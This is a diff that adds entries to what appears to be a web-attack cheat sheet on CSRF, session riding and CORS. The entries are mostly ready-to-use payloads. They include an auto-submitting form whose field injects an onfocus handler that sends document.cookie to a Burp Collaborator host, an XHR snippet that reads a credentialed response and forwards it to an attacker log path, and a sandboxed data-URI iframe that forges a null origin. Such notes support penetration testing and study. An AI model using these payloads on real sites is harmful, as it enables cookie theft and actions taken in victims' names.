@@ -45,8 +45,42 @@ xhr.open("POST", uri, true);
 xhr.send(form);
 ```
 
+Submit form
+
+```html
+<form id="f" action="http://<target>" method="POST" enctype="multipart/form-data">
+<input type="password" name="password">
+<input type="password" name="password2">
+<input name="website" value="asdf onfocus=location=`http://ttqkxnrpzv248m4hy0oagrvxcoie63.burpcollaborator.net`+document.cookie autofocus">
+<input type="file" name="avatar">
+</form>
+<script>
+i=document.createElement('input');
+i.name="submit";
+f.append(i);
+f.submit();
+</script>
+```
+
 ## Session Riding
 
+**XHR** api
+```javascript
+## send cookie with XHR
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open("GET", "http://<target>/somepage", true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   // do something after sent
+   // for example. pass response to attacker's server
+   location='/log?key='+this.responseText;
+};
+```
+
+**Fetch** api
 ```javascript
 var href = "http://<target>/somepage";
 fetch(href, {
@@ -152,4 +186,19 @@ function handleReply(event) {
 }
 ```
 
+## bypass `Access-Control-Allow-Origin: null`
 
+Requirement: X-FRAME-OPTIONS not set 
+
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+<script>
+    // do something
+</script>
+"></iframe>
+```
+
+
+## Reference
+
+1. [PortSwigger CORS](https://portswigger.net/web-security/cors)
